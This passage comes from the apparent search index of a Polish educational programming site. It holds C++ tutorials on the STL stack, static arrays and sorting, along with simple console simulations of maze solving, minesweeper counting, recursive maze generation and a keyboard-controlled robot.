implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;stack&gt;\n\nusing namespace std;\n\nint main() {\n    cout &lt;&lt; \"Create stack containing values of type int\" &lt;&lt; endl;\n    // We can create empty stack writing: stack&lt;elements_type&gt; variable_name;\n    stack&lt;int&gt; st;\n\n    // To get current size of the stack (number of elements in it) we use \"size\" method\n    cout &lt;&lt; \"Size of the stack: \" &lt;&lt; st.size() &lt;&lt; endl;\n\n    cout &lt;&lt; endl &lt;&lt; \"Add new elements to top of the stack\" &lt;&lt; endl;\n    // To add new elements to the stack we use \"push\" method\n    // This places new element passed as a parameter at the top of the stack\n    st.push(5);\n    st.push(-50);\n    st.push(25);\n\n    cout &lt;&lt; \"Size of the stack: \" &lt;&lt; st.size() &lt;&lt; endl;\n\n    // To get value of the top element in the stack we use \"top\" method\n    // This method does not remove element from the stack\n    cout &lt;&lt; endl &lt;&lt; \"Top element of the stack: \" &lt;&lt; st.top() &lt;&lt; endl;\n    cout &lt;&lt; \"Removing top element from the stack\" &lt;&lt; endl;\n    // To remove top element of the stack (last added) we use \"pop\" method\n    // This method only removes the top element without returning its value\n    st.pop();\n    cout &lt;&lt; \"Top element of the stack: \" &lt;&lt; st.top() &lt;&lt; endl;\n    cout &lt;&lt; \"Size of the stack: \" &lt;&lt; st.size() &lt;&lt; endl;\n\n    cout &lt;&lt; endl &lt;&lt; \"Clearing stack by assigning new value to it\" &lt;&lt; endl;\n    st = stack&lt;int&gt;();\n\n    cout &lt;&lt; \"Size of the stack: \" &lt;&lt; st.size() &lt;&lt; endl;\n\n    cout &lt;&lt; endl &lt;&lt; \"Checking if stack is empty\" &lt;&lt; endl;\n    // To check if stack is empty (its size is equal to zero) we can use \"empty\" method\n    // This method returns true if stack is empty, false otherwise\n    if (st.empty()) {\n        cout &lt;&lt; \"Stack is empty\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; \"Stack is not empty\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/stack/#link-do-implementacji","title":"Link do implementacji","text":"<p>stack - przyk\u0142ady</p>"},{"location":"programming/c%2B%2B/introduction/stl/static-array/","title":"Tablica statyczna","text":""},{"location":"programming/c%2B%2B/introduction/stl/static-array/#opis","title":"Opis","text":"<p>Tablice statyczne te\u017c mog\u0105 by\u0107 obiektem, co niesie ze sob\u0105 kilka korzy\u015bci.</p>"},{"location":"programming/c%2B%2B/introduction/stl/static-array/#biblioteka","title":"Biblioteka","text":"<p>Tablica statyczna znajduje si\u0119 w bibliotece <code>array</code>.</p> <pre><code>#include &lt;array&gt;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/static-array/#dokumentacja","title":"Dokumentacja","text":"<p>Array Reference</p>"},{"location":"programming/c%2B%2B/introduction/stl/stl-sorting/","title":"Sortowanie","text":""},{"location":"programming/c%2B%2B/introduction/stl/stl-sorting/#opis","title":"Opis","text":"<p>Sortowanie danych jest operacj\u0105, z kt\u00f3rej korzystamy praktycznie na co dzie\u0144.  Jest to tak\u017ce operacja, kt\u00f3ra jest wymagana w wielu algorytmach.  Nie od dzi\u015b wiadomo, \u017ce na danych posortowanych pewne dzia\u0142ania mo\u017cna wykona\u0107 znacznie efektywniej.  Od wydajno\u015bci algorytmu sortowania mo\u017ce wi\u0119c zale\u017ce\u0107 wydajno\u015b\u0107 ca\u0142ej implementacji.  Oczywi\u015bcie mo\u017cemy za ka\u017cdym razem implementowa\u0107 sortowanie samodzielnie (tak czasem b\u0119dzie wydajniej), ale zazwyczaj wystarczy skorzysta\u0107 z gotowej implementacji zawartej w STL, a konkretnie w bibliotece <code>algorithm</code>. </p>"},{"location":"programming/c%2B%2B/introduction/stl/stl-sorting/#biblioteka","title":"Biblioteka","text":"<p>Funkcja sortuj\u0105ca (a tak\u017ce wiele innych) znajduje si\u0119 w bibliotece <code>algorithm</code>.</p> <pre><code>#include &lt;algorithm&gt;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/stl-sorting/#przykad","title":"Przyk\u0142ad","text":"<p>Poni\u017csza implementacja pokazuje przyk\u0142adowe wykorzystanie funkcji <code>sort</code> z biblioteki <code>algorithm</code>.</p>"},{"location":"programming/c%2B%2B/introduction/stl/stl-sorting/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\n/// Prints content of the vector\n/// \\param array - vector to prints content of\nvoid printVector(vector&lt;int&gt; array) {\n    for (int el : array) {\n        cout &lt;&lt; el &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\n/// Compute absolute value of given integer\n/// \\param a - integer to compute an absolute value of\n/// \\return Absolute value of a\nint abs(int a) {\n    if (a &lt; 0) {\n        return -a;\n    } else {\n        return a;\n    }\n}\n\n/// Compare two elements using their absolute values\n/// \\param a - first value\n/// \\param b - second value\n/// \\result true if absolute value of a is lower than absolute value of b, false otherwise\nbool compare(int a, int b) {\n    return abs(a) &lt; abs(b);\n}\n\nint main() {\n    vector&lt;int&gt; array;\n    array.push_back(5);\n    array.push_back(-2);\n    array.push_back(-6);\n    array.push_back(12);\n    array.push_back(0);\n\n    cout &lt;&lt; \"Sorting array in ascending order\" &lt;&lt; endl;\n    sort(array.begin(), array.end());\n    printVector(array);\n\n    cout &lt;&lt; \"Sorting array in descending order\" &lt;&lt; endl;\n    sort(array.rbegin(), array.rend());\n    printVector(array);\n\n    cout &lt;&lt; \"Sorting array using custom comparing function\" &lt;&lt; endl;\n    sort(array.begin(), array.end(), compare);\n    printVector(array);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/stl-sorting/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie z STL - przyk\u0142ad</p>"},{"location":"programming/c%2B%2B/introduction/stl/stl-sorting/#opis-implementacji","title":"Opis implementacji","text":"<p>Na pocz\u0105tku tworzymy nowy <code>vector</code> o nazwie <code>array</code> (linia 37), kt\u00f3ry s\u0142u\u017cy nam za tablic\u0119 do posortowania. Nast\u0119pnie sortujemy tablic\u0119 rosn\u0105co, wykorzystuj\u0105c do tego funkcj\u0119 <code>sort</code> zawart\u0105 w bibliotece <code>algorithm</code>. Jako argumenty do funkcji podajemy wska\u017aniki na pocz\u0105tek i koniec sortowanego zakresu (linia 45). Podany przedzia\u0142 jest prawostronnie otwarty. Po posortowaniu tablicy wypisujemy j\u0105 korzystaj\u0105c z pomocniczej funkcji <code>printVector</code>.</p> <p>W celu posortowania tablicy malej\u0105co, mo\u017cemy skorzysta\u0107 z odwr\u00f3conych wska\u017anik\u00f3w (reverse iterator) (linia 49).</p> <p>Mo\u017cemy tak\u017ce skorzysta\u0107 z w\u0142asnej funkcji por\u00f3wnuj\u0105cej. Funkcja ta powinna przyjmowa\u0107 dwa argumenty o typie zgodnym z typem element\u00f3w przechowywanych w tablicy. Funkcja powinna zwraca\u0107 wynik typu <code>bool</code> okre\u015blaj\u0105cy, czy elementy podane jako argumenty znajduj\u0105 si\u0119 we w\u0142a\u015bciwym porz\u0105dku (wynik <code>true</code>), czy te\u017c nie (wynik <code>false</code>). Przyk\u0142ad takiej funkcji por\u00f3wnuj\u0105cej stanowi powy\u017csza funkcja <code>compare</code> (linia 32), kt\u00f3ra por\u00f3wnuje elementy po ich warto\u015bci bezwzgl\u0119dnej.</p> <p>W celu skorzystania z w\u0142asnej funkcji por\u00f3wnuj\u0105cej, podajemy j\u0105 jako trzeci argument przy wywo\u0142aniu funkcji <code>sort</code> (linia 53).</p>"},{"location":"programming/c%2B%2B/simulations/","title":"Symulacje","text":"<p>R\u00f3\u017cnorodne symulacje zaimplementowane w j\u0119zyku C++ przy u\u017cyciu biblioteki cstdlib. Powinny dzia\u0142a\u0107 bez wi\u0119kszych problem\u00f3w pod systemem Windows. </p> <p>Uwaga: nacisk po\u0142o\u017cony zosta\u0142 na \u0142atwo\u015b\u0107 i czytelno\u015b\u0107 rozwi\u0105zania, a nie na jego jako\u015b\u0107. W zwi\u0105zku z tym pokazanych metod nale\u017cy u\u017cywa\u0107 raczej wy\u0142\u0105cznie w celach dydaktycznych.</p>"},{"location":"programming/c%2B%2B/simulations/maze-template/","title":"Labirynt - szablon","text":"C++labirynt.txt <pre><code>#include &lt;iostream&gt;\n#include &lt;cstdlib&gt;\n#include &lt;windows.h&gt;\n#include &lt;fstream&gt; // Biblioteka do obslugi plikow\nusing namespace std;\n\n/// Funkcja wyswietla labirynt na ekranie\nvoid wyswietlLabirynt(string labirynt[], int n, int m)\n{\n    for(int w = 0; w &lt; n; w++)\n    {\n        for(int k = 0; k &lt; m; k++)\n        {\n            cout &lt;&lt; labirynt[w][k];\n        }\n\n        cout &lt;&lt; endl;\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main()\n{\n    ifstream plik(\"labirynt.txt\");\n\n    int n, m;  /// Wysokosc - n, Szerokosc - m\n    int startK, startW, stopK, stopW;\n\n    plik &gt;&gt; n &gt;&gt; m;   /// Wczytujemy dane z pliku podobnie jak przy pomocy operatora cin\n\n    string labirynt[n], tmp;\n\n    /// Uzywamy raz polecenia getline, ignorujac to co wczyta\n    getline(plik, tmp);\n\n    /// Wczytujemy n wierszy labiryntu z pliku\n    for(int i = 0; i &lt; n; i++)\n    {\n        /// plik &gt;&gt; labirynt[i]; // To nie zadziala poprawnie\n        /// Musimy wczytac cala linie\n        getline(plik, labirynt[i]);\n    }\n\n    plik &gt;&gt; startK &gt;&gt; startW &gt;&gt; stopK &gt;&gt; stopW;\n\n    /// Pamietamy o zamknieciu pliku\n    plik.close();\n\n    /// Wysiwetlamy wczytane dane na ekranie\n\n    cout &lt;&lt; \"Wysokosc: \" &lt;&lt; n &lt;&lt; endl;\n    cout &lt;&lt; \"Szerokosc: \" &lt;&lt; m &lt;&lt; endl;\n\n    wyswietlLabirynt(labirynt, n, m);\n\n    cout &lt;&lt; \"StartK: \" &lt;&lt; startK &lt;&lt; \", StartW: \" &lt;&lt; startW &lt;&lt; endl;\n    cout &lt;&lt; \"StopK: \" &lt;&lt; stopK &lt;&lt; \", StopW: \" &lt;&lt; stopW &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre> <pre><code>10 10\n##########\n#       ##\n##  ######\n##  ######\n##  ######\n##  ######\n###     ##\n####### ##\n####    ##\n##########\n1 1\n8 4\n</code></pre>"},{"location":"programming/c%2B%2B/simulations/maze/","title":"Labirynt","text":""},{"location":"programming/c%2B%2B/simulations/maze/#opis-problemu","title":"Opis problemu","text":"<p>TODO</p>"},{"location":"programming/c%2B%2B/simulations/maze/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/simulations/maze/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - wymiar kwadratowego labiryntu</li> <li>\\(labirynt[n][n]\\) - dwuwymiarowa tablica definiuj\u0105ca labirynt, w kt\u00f3rym spacja oznacza wolne miejsce, a znak hasz oznacza \u015bcian\u0119</li> <li>\\(startK, startW\\) - wsp\u00f3\u0142rz\u0119dne punktu startowego (kolumna i wiersz)</li> <li>\\(stopK, stopW\\) - wsp\u00f3\u0142rz\u0119dne punktu docelowego (kolumna i wiersz)</li> </ul>"},{"location":"programming/c%2B%2B/simulations/maze/#wynik","title":"Wynik","text":"<ul> <li>Dotarcie z punktu startowego do ko\u0144cowego.</li> </ul>"},{"location":"programming/c%2B%2B/simulations/maze/#opis-pomysu","title":"Opis pomys\u0142u","text":"<p>Ka\u017cdemu polu w labiryncie przypisujemy warto\u015b\u0107 liczbow\u0105, kt\u00f3ra b\u0119dzie s\u0142u\u017cy\u0142a za licznik odwiedzin. Na pocz\u0105tku ka\u017cdemu polu przypisujemy warto\u015b\u0107 0. Gdy w trakcie poruszania si\u0119 po labiryncie odwiedzimy dane pole, to zwi\u0119kszymy warto\u015b\u0107 jego licznika o 1. W ka\u017cdym kolejnym kroku wybieramy jedno z s\u0105siednich p\u00f3l o najmniejszej warto\u015bci licznika.</p>"},{"location":"programming/c%2B%2B/simulations/maze/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cstdlib&gt;\n#include &lt;windows.h&gt;\n\nusing namespace std;\n\nint main() {\n    int n = 10; /// Labirynt ma wymiar n x n\n    string labirynt[10];\n\n    labirynt[0] = \"##########\";\n    labirynt[1] = \"#       ##\";\n    labirynt[2] = \"##  ######\";\n    labirynt[3] = \"##  ######\";\n    labirynt[4] = \"##  ######\";\n    labirynt[5] = \"#       ##\";\n    labirynt[6] = \"###### ###\";\n    labirynt[7] = \"###### ###\";\n    labirynt[8] = \"######  ##\";\n    labirynt[9] = \"##########\";\n\n    int startK = 1; /// Kolumna\n    int startW = 1; /// Wiersz\n\n    int stopK = 7; /// Kolumna\n    int stopW = 8; /// Wiersz\n\n    /*\n        Pomysl 1:\n            - Poruszamy sie tak jak wczesniej\n            - Odwiedzone pola odznaczamy, np. kropka\n            - Gdy natrafimy na rozgalezienie, to zapamietujemy jego wspolrzedne\n            - Gdy dotrzemy do slepego zaulka, to wracamy do rozgalezienia i idziemy dalej\n            - problem: pamietac kilka rozgalezien\n\n        Pomysl 2:\n            - losowe wybieranie drogi na rozgalezieniu\n            - w petli zaczynamy droge od punktu startowego\n            - gdy dojdziemy do slepego zaulka, to zaczynamy od nowa\n            - pomysl: zapamietywanie drog, przez ktore przeszlismy, zeby wybierac inne\n\n        Pomysl 3:\n            - Algorytm/zasada prawej/lewej reki\n\n        Pomysl 4:\n            - Kazdemu polu przypisujemy wartosc liczbowa, zaczynamy od 0\n            - Gdy odwiedzamy pole, to zwiekszamy jego wartosc o 1\n            - W kazdym kroku wybieramy pole z najmniejsza wartoscia jako kolejny ruch\n\n        Pomysl 5:\n            - Przedstawic labirynt jako graf\n            - Skrzyzowania jako wierzcholki\n            - Krawedzie wazone z waga proporcjonalna do dlugosci krawedzi\n    */\n\n    /// Implementujemy pomysl 4\n\n    /// Tworzymy tablice do zapamietania licznikow dla pol\n    int odwiedziny[n][n];\n\n    /// Wypelniamy tablice odwiedzin\n    for(int i = 0; i &lt; n; i++) {\n        for(int j = 0; j &lt; n; j++) {\n            if(labirynt[i][j] == ' ') {\n                odwiedziny[i][j] = 0;\n            } else {\n                /// W miejsce scian wpisujemy duza liczbe,\n                /// zeby te pola nie zostaly wybrane przez algorytm\n                odwiedziny[i][j] = 10000000;\n            }\n        }\n    }\n\n    /// Zmienne do pozycji komputera\n    int pozycjaK;\n    int pozycjaW;\n\n    /// Zapamietujemy, ile wykonalismy ruchow\n    int ileRuchow = 0;\n\n    /// Na poczatku komputer jest w miejscu start\n    pozycjaK = startK;\n    pozycjaW = startW;\n\n    /// Dopoki nie jestesmy w miejscu stop\n    while(pozycjaK != stopK || pozycjaW != stopW) {\n\n        /// Zapamietujemy liczby przypisane do pol naokolo\n        int lewo, prawo, gora, dol;\n\n        lewo = odwiedziny[pozycjaW][pozycjaK - 1];\n        prawo = odwiedziny[pozycjaW][pozycjaK + 1];\n        dol = odwiedziny[pozycjaW + 1][pozycjaK];\n        gora = odwiedziny[pozycjaW - 1][pozycjaK];\n\n        /// Zwiekszamy licznik obecnego pola\n        odwiedziny[pozycjaW][pozycjaK]++;\n\n        if(lewo &lt;= prawo &amp;&amp; lewo &lt;= dol &amp;&amp; lewo &lt;= gora) {\n            /// Idziemy w lewo\n            pozycjaK--; /// Poruszamy sie w lewo\n            ileRuchow++; /// Zwiekszamy licznik krokow\n        } else if(prawo &lt;= lewo &amp;&amp; prawo &lt;= dol &amp;&amp; prawo &lt;= gora) {\n            /// Idziemy w prawo\n            pozycjaK++;\n            ileRuchow++;\n        } else if(gora &lt;= lewo &amp;&amp; gora &lt;= dol &amp;&amp; gora &lt;= prawo) {\n            /// Idziemy w gore\n            pozycjaW--;\n            ileRuchow++;\n        } else {\n            /// Idziemy w dol\n            pozycjaW++;\n            ileRuchow++;\n        }\n\n        /// Czyscimy ekran konsoli\n        system(\"cls\");\n\n        /// Wyswietlamy labirynt na ekranie\n        for(int w = 0; w &lt; n; w++)\n        {\n            for(int k = 0; k &lt; n; k++)\n            {\n                /// Jezeli w i k sa pozycjami robota, to wypisz @\n                /// W przeciwnym przypadku wypisz znak z labiryntu\n                if(w == pozycjaW &amp;&amp; k == pozycjaK)\n                {\n                    cout &lt;&lt; \"@\";\n                }\n                else\n                {\n                    cout &lt;&lt; labirynt[w][k];\n                }\n            }\n\n            cout &lt;&lt; endl;\n        }\n\n        cout &lt;&lt; endl &lt;&lt; endl;\n\n        /// Wyswietlamy labirynt na ekranie\n        for(int w = 0; w &lt; n; w++)\n        {\n            for(int k = 0; k &lt; n; k++)\n            {\n                if(odwiedziny[w][k] == 10000000) {\n                    cout &lt;&lt; \"- \";\n                }\n                 else {\n                    cout &lt;&lt; odwiedziny[w][k] &lt;&lt; \" \";\n                 }\n            }\n\n            cout &lt;&lt; endl;\n        }\n\n        cout &lt;&lt; \"Liczba ruchow: \" &lt;&lt; ileRuchow &lt;&lt; endl;\n\n        /// Czekamy chwile, np. 1 sekunde\n        Sleep(1000);\n    }\n\n    cout &lt;&lt; \"Liczba ruchow: \" &lt;&lt; ileRuchow &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/simulations/maze/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/Maze#main.cpp</p>"},{"location":"programming/c%2B%2B/simulations/maze/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p> <p>Warning</p> <p>Pod systemem Linux zamiast polecenia cls u\u017cywamy polecenia clear do wyczyszczenia ekranu terminala.</p> <p>Warning</p> <p>Pod systemem Linux polecenie Sleep nale\u017cy zast\u0105pi\u0107 poleceniem usleep, kt\u00f3re jako parametr przyjmuje mikrosekundy, a nie milisekundy. Trzeba tak\u017ce zmieni\u0107 bibliotek\u0119 \"windows.h\" na \"unistd.h\".</p>"},{"location":"programming/c%2B%2B/simulations/minesweeper/","title":"Saper","text":""},{"location":"programming/c%2B%2B/simulations/minesweeper/#opis","title":"Opis","text":"<p>Jak wygl\u0105da klasyczna ju\u017c gra Saper wie chyba ka\u017cdy. Dla porz\u0105dku przypomnijmy jednak jej najwa\u017cniejsze aspekty:</p> <ul> <li>Prostok\u0105tna plansza wype\u0142niona kwadratowymi polami.</li> <li>Na cz\u0119\u015bci z p\u00f3l znajduj\u0105 si\u0119 tzw. bomby.</li> <li>Pozosta\u0142e pola wype\u0142nione s\u0105 liczbami, kt\u00f3re oznaczaj\u0105, ile s\u0105siednich p\u00f3l (na ukos tak\u017ce) zajmuj\u0105 bomby.</li> </ul> <p>Pocz\u0105tkowo plansza jest zakryta, a celem gry jest odkrycie wszystkich p\u00f3l poza bombami. My jednak zajmiemy si\u0119 czym\u015b prostszym: dla zadanej odkrytej planszy wype\u0142nionej bombami nale\u017cy uzupe\u0142ni\u0107 pozosta\u0142e pola w\u0142a\u015bciwymi liczbami.</p>"},{"location":"programming/c%2B%2B/simulations/minesweeper/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/simulations/minesweeper/#dane","title":"Dane:","text":"<ul> <li>\\(n\\) - liczba naturalna, wysoko\u015b\u0107 planszy</li> <li>\\(m\\) - liczba naturalna, szeroko\u015b\u0107 planszy</li> <li>\\(plansza[n][m]\\) - plansza wype\u0142niona znakami \\(*\\) oraz \\(.\\) oznaczaj\u0105cymi odpowiednio bomb\u0119 i pole puste</li> </ul>"},{"location":"programming/c%2B%2B/simulations/minesweeper/#wynik","title":"Wynik","text":"<ul> <li>\\(plansza[n][m]\\) - plansza wype\u0142niona bombami i liczbami zgodnie z regu\u0142ami gry saper</li> </ul>"},{"location":"programming/c%2B%2B/simulations/minesweeper/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\n/// Funkcja wypisuje tablice na ekranie\nvoid wypisz(string tab[], int n) {\n    for(int i = 0; i &lt; n; i++) {\n        cout &lt;&lt; tab[i] &lt;&lt; endl;\n    }\n\n    cout &lt;&lt; endl;\n}\n\n/// Funkcja zastepuje kropki wartosciami oznaczajacymi ilosc sasiadujacych z polem bomb\nvoid policz(string tab[], int n, int m) {\n    for(int x = 0; x &lt; n; x++) {\n        for(int y = 0; y &lt; m; y++) {\n            int licznikBomb = 0;\n\n            /*if(x &gt; 0) {\n                if(tab[x-1][y] == '*') {\n                    licznikBomb++;\n                }\n            }*/\n\n            for(int px = -1; px &lt;= 1; px++) {\n                for(int py = -1; py &lt;= 1; py++) {\n                    int noweX = x + px;\n                    int noweY = y + py;\n\n                    /// Sprawdzamy, czy nowe pole miesci sie w tablicy\n                    if(noweX &gt;= 0 &amp;&amp; noweY &gt;= 0 &amp;&amp; noweX &lt; n &amp;&amp; noweY &lt; m) {\n                        if(tab[noweX][noweY] == '*') {\n                            licznikBomb++;\n                        }\n                    }\n                }\n            }\n\n            /// Je\u017celi obecne pole jest puste\n            if(tab[x][y] == '.') {\n                /// Zeby przekonwertowac liczbe na znak, dodajemy do niej wartosc znaku '0' z tablicy ASCII\n                tab[x][y] = licznikBomb + '0';\n            }\n        }\n    }\n}\n\nvoid policz2(string tab[], int n, int m) {\n    for(int x = 0; x &lt; n; x++) {\n        for(int y = 0; y &lt; m; y++) {\n            int licznikBomb = 0;\n\n            /// Tworzymy pomocnicze tablice\n            /// okreslaja gdzie leza sasiedzi\n\n            int X[8] = {-1, -1, -1,  0, 0,  1, 1, 1};\n            int Y[8] = {-1,  0,  1, -1, 1, -1, 0, 1};\n\n            for(int k = 0; k &lt;= 7; k++) {\n                int noweX = x + X[k];\n                int noweY = y + Y[k];\n\n                /// Sprawdzamy, czy nowe pole miesci sie w tablicy\n                if(noweX &gt;= 0 &amp;&amp; noweY &gt;= 0 &amp;&amp; noweX &lt; n &amp;&amp; noweY &lt; m) {\n                    if(tab[noweX][noweY] == '*') {\n                        licznikBomb++;\n                    }\n                }\n            }\n\n            /// Je\u017celi obecne pole jest puste\n            if(tab[x][y] == '.') {\n                /// Zeby przekonwertowac liczbe na znak, dodajemy do niej wartosc znaku '0' z tablicy ASCII\n                tab[x][y] = licznikBomb + '0';\n            }\n        }\n    }\n}\n\n/// Odwiedzamy sasiaduje pola\n/// Dla kazdej napotkanej bomby zwiekszamy licznik\n/// Po sprawdzeniu sasiadow wpisujemy wartosc licznika do obecnego pola\n\n/// Potencjalne problemy:\n///  - Wyjscie poza tablice\n///  - Konwersja liczby na znak\n///  - Uciazliwe odwiedzanie sasiadow\n\n/*\n    (x+(-1), y-1) (x-1, y) (x-1, y+1)\n    (x+0,   y-1) (x,   y) (x,   y+1)\n    (x+1, y-1) (x+1, y) (x+1, y+1)\n*/\n\nint main() {\n    int n, m; /// Wymiary planszy n x m\n\n    n = 5;\n    m = 6;\n\n    string plansza[n];\n\n    plansza[0] = \"*.....\";\n    plansza[1] = \"......\";\n    plansza[2] = \"**....\";\n    plansza[3] = \"....**\";\n    plansza[4] = \"....**\";\n\n    cout &lt;&lt; \"Plansza gry:\" &lt;&lt; endl;\n    wypisz(plansza, n);\n\n    policz2(plansza, n, m);\n\n    cout &lt;&lt; \"Policzona plansza gry:\" &lt;&lt; endl;\n    wypisz(plansza, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/simulations/minesweeper/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/Saper#main.cpp</p>"},{"location":"programming/c%2B%2B/simulations/recursion-in-maze/","title":"Rekurencja w labiryncie","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;random&gt;\n#include &lt;ctime&gt;\nusing namespace std;\n\nvoid wypisz(string labirynt[], int n) {\n    for(int i = 0; i &lt; n; i++) {\n        cout &lt;&lt; labirynt[i] &lt;&lt; endl;\n    }\n\n    cout &lt;&lt; endl;\n}\n\nbool sprawdzKorytarz(int wys, int szer, string labirynt[], int n) {\n    /// Sprawdzamy, czy jestesmy u celu\n    if(wys == n-2 &amp;&amp; szer == n-2) {\n        return true;\n    }\n\n    bool wynik = false;\n\n    /// Jezeli jest krawedz w dol\n    if(labirynt[wys+1][szer] == ' ') {\n        wynik = sprawdzKorytarz(wys + 2, szer, labirynt, n);\n        if(wynik == true) {\n            return true;\n        }\n    }\n\n    if(labirynt[wys][szer+1] == ' ') {\n        wynik = sprawdzKorytarz(wys, szer + 2, labirynt, n);\n        if(wynik == true) {\n            return true;\n        }\n    }\n\n    /// Skoro dotarlismy tutaj w kodzie, to nie zwrocilismy true\n    return false;\n}\n\nint main() {\n    /// Inicjalizujemy liczby losowe\n    srand(time(NULL));\n\n    int n;\n    cout &lt;&lt; \"Podaj wymiar labiryntu: \";\n    cin &gt;&gt; n;\n    string labirynt[n];\n\n    // Krok 1. Wypelniamy cala tablice scianami (#)\n    // Krok 2. Zamieniamy co drugie pole na puste\n\n    // Dla kazdego wiersza\n    for(int w = 0; w &lt; n; w++) {\n        // Dla kazdej kolumny\n        for(int k = 0; k &lt; n; k++) {\n            // Dopisujemy znak # do wiersza w\n            labirynt[w] += 219;\n        }\n    }\n\n    for(int w = 1; w &lt; n - 1; w += 2) {\n        for(int k = 1; k &lt; n - 1; k += 2) {\n            labirynt[w][k] = ' ';\n        }\n    }\n\n    wypisz(labirynt, n);\n\n    /*\n        1. Dla kazdego pustego pola, wykonuj:\n            2. Wybierz jednego z sasiadow: lewo lub gora (jezeli istnieje)\n            3. Usun sciane w wybranym kierunku\n    */\n\n    for(int w = 1; w &lt; n - 1; w += 2) {\n        for(int k = 1; k &lt; n - 1; k += 2) {\n            if(w == 1 &amp;&amp; k != 1) {\n                /// Robimy przejscie w lewo\n                labirynt[w][k-1] = ' ';\n            } else if(w != 1 &amp;&amp; k == 1) {\n                /// Robimy przejscie do gory\n                labirynt[w-1][k] = ' ';\n            } else if(w != 1 &amp;&amp; k != 1) {\n                /// Losowo wybieramy lewo lub gora\n                int losowa;\n                losowa = rand() % 2;\n                if(losowa == 0) {\n                    labirynt[w][k-1] = ' ';\n                } else {\n                    labirynt[w-1][k] = ' ';\n                }\n            }\n        }\n    }\n\n    wypisz(labirynt, n);\n\n    cout &lt;&lt; sprawdzKorytarz(1, 1, labirynt, n) &lt;&lt; endl;\n\n    /*\n        Zaczynamy w (1,1) - lewy gorny rog\n        Chcemy dotrzec do punktu (n-2, n-2) - prawy dolny rog\n    */\n\n    /// Idea:\n    /// Zaczynamy w punkcie startowym\n    ///  Sprawdzamy sciezke w dol, a jak nie dotrzemy do sprawdzamy w prawo\n    return 0;\n}\n\n/// bool sprawdzKorytarz(int wys, int szer)\n///      Jezeli jestesmy u celu, to zwracamy prawda i konczymy\n///   .  Jezeli nie jestesmy u celu, to:\n///   .      Jezeli jest krawedz w dol, to sprawdzamy, czy idac w dol dojdziemy do celu\n///             sprawdzKorytarz(wys+2, szer)\n///   .      Jezeli to nie pomoglo i mozemy pojsc w prawo, to sprawdzamy czy w prawo dojdziemy do celu\n///             sprawdzKorytarz(wys, szer+2)\n///      Jezeli nie dotarlismy, albo nie mozemy isc w dol ani w prawo, to zwracamy falsz\n/*\n    labirynt[0] = \"###########\";\n    labirynt[1] = \"# # # # # #\";\n    labirynt[2] = \"###########\";\n    labirynt[3] = \"# # # # # #\";\n    labirynt[4] = \"###########\";\n    labirynt[5] = \"# # # # # #\";\n    labirynt[6] = \"###########\";\n    labirynt[7] = \"# # # # # #\";\n    labirynt[8] = \"###########\";\n    labirynt[9] = \"# # # # # #\";\n    labirynt[10] =\"###########\";\n    */\n</code></pre>"},{"location":"programming/c%2B%2B/simulations/robot-in-maze/","title":"Robot w labiryncie","text":"<p>Prosta symulacja robota poruszaj\u0105cego si\u0119 po labiryncie.</p> <p>U\u017cytkownik wydaje polecenia <code>W</code>, <code>S</code>, <code>A</code>lub <code>D</code>, a robot przemieszcza si\u0119 po labiryncie zgodnie z wybranym kierunkiem ruchu.</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;cstdlib&gt;\n\nusing namespace std;\n\nint main()\n{\n    int n = 5; /// Labirynt ma wymiar n x n\n      char polecenie;\n      int robotW, robotK; /// Wiersz i kolumna robota - jego pozycja\n    string labirynt[5];\n\n    labirynt[0] = \"#####\";\n    labirynt[1] = \"#   #\";\n    labirynt[2] = \"# # #\";\n    labirynt[3] = \"# # #\";\n    labirynt[4] = \"#####\";\n\n    robotW = 3;\n    robotK = 1;\n\n    while(true)\n    {\n        system(\"cls\");\n\n        /// Wyswietlamy labirynt na ekranie\n        for(int w = 0; w &lt; n; w++)\n        {\n            for(int k = 0; k &lt; n; k++)\n            {\n                /// Jezeli w i k sa pozycjami robota, to wypisz @\n                /// W przeciwnym przypadku wypisz znak z labiryntu\n                if(w == robotW &amp;&amp; k == robotK)\n                {\n                    cout &lt;&lt; \"@\";\n                }\n                else\n                {\n                    cout &lt;&lt; labirynt[w][k];\n                }\n            }\n\n            cout &lt;&lt; endl;\n        }\n\n        cin &gt;&gt; polecenie;\n\n        switch(polecenie)\n        {\n        case 'a':\n            if(labirynt[robotW][robotK - 1] != '#')   /// Jezeli pod nowym miejscem nie ma sciany\n            {\n                robotK--; /// Przemieszczamy robota w lewo\n            }\n\n            break;\n        case 'd':\n            if(labirynt[robotW][robotK + 1] != '#')   /// Jezeli pod nowym miejscem nie ma sciany\n            {\n                robotK++; /// Przemieszczamy robota w lewo\n            }\n\n            break;\n        case 'w':\n            if(labirynt[robotW-1][robotK] != '#')   /// Jezeli pod nowym miejscem nie ma sciany\n            {\n                robotW--; /// Przemieszczamy robota w lewo\n            }\n\n            break;\n        case 's':\n            if(labirynt[robotW+1][robotK] != '#')   /// Jezeli pod nowym miejscem nie ma 